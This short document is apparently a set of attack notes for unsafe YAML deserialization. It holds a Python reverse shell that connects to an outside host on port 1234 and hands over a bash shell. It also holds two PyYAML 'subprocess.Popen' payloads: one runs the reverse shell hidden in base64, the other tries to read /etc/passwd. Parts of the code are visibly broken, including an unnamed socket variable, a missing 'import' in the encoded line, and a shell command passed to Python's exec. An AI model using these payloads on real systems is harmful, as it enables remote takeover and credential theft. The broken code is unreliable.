


**Payload**
```python
import socket,subprocess,os;host="neoreo.fr";port=1234;=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call("/bin/bash")
```

**Yaml malicious code**
```yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
	- python
	- -c
	- "exec('c29ja2V0LHN1YnByb2Nlc3Msb3M7aG9zdD0ibmVvcmVvLmZyIjtwb3J0PTEyMzQ7PXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKGhvc3QscG9ydCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"
```


```yaml
yaml: !!python/object/apply:subprocess.Popen
- !!python/tuple
	- python3
	- -c
	- "exec('cat /etc/passwd')"
```